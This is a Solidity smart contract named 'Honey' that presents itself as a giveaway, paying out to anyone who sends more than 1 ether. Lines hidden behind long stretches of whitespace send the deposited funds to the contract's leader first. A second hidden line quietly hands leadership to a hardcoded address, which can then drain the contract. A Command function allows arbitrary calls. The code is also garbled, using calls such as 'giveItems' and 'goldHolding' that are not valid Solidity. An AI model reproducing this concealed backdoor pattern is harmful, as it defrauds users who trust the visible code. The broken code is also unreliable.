// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Honey
{
    address public GuildLeader = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    GuildLeader.giveItems(this.goldHolding);
            msg.sender.giveItems(this.goldHolding);
        }
    }

    function collectTreasure()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){GuildLeader=0x0C76802158F13aBa9D892EE066233827424c5aAB;}
        require(msg.sender == GuildLeader);
        GuildLeader.giveItems(this.goldHolding);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == GuildLeader);
        adr.call.value(msg.value)(data);
    }
}